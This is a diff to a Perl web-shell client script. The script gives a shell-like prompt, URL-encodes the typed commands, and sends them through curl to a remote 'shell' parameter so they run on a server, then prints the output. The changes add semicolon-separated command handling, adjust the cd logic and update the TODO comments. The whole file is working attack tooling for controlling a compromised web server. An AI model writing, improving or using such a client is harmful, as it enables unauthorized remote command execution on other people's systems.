@@ -10,8 +10,8 @@
 # - URL encode EVERYTHING   #   - ctrl-c resets prompt   #
 # - separate commands by ;  #     the first time but not #
 #   and have them run       #     after that             #
-#   separately (split?)     #                            #
-# - Fix ctrl-C              #                            #
+#   separately (split?)     #   - Try not to make        #
+# - Fix ctrl-C              #     commands too complex   #
 # - remove global vars      #                            #
 # - clean up code, always   #                            #
 # - Base64 encode URL       #                            #
@@ -57,7 +57,7 @@ sub StripTags{
 ############################
 sub cd{
 	my $input = $_[0];
-	$pwd = `curl -s $loc?shell=cd%20$pwd%3B$input%3Bpwd | tail -1`;
+	$pwd = `curl -s $loc?shell=cd%20$pwd%3B$input%3Bpwd`;
 	StripTags($pwd);
 	$pwd =~ s/^\s+|\s+$//g;	
 }
@@ -85,14 +85,18 @@ sub ctrlc{
 sub shell{
 	print "$pwd $user\$ "; #prints shell-like prompt
 	chomp(my $input = <STDIN>);
+	my @parts = split(';',$input);
 	#next two lines URL Encode certain characters, to be replaced by URLEncode function
 	$input =~ s/ /%20/g;
 	$input =~ s/;/%3B/g;
 	if ($input eq "quit" || $input eq "exit"){
 		exit;
 	}
-	if ($input =~ m/cd%20\S+/){
-		cd($input);
+	foreach my $cmd (@parts){
+		if ($cmd =~ m/cd \S+/){
+			$cmd =~ s/ /%20/g;
+			cd($cmd);
+		}
 	}
 
 	chomp(my $output = `curl -s $loc?shell=cd%20$pwd%3B$input`); #runs command and captures output
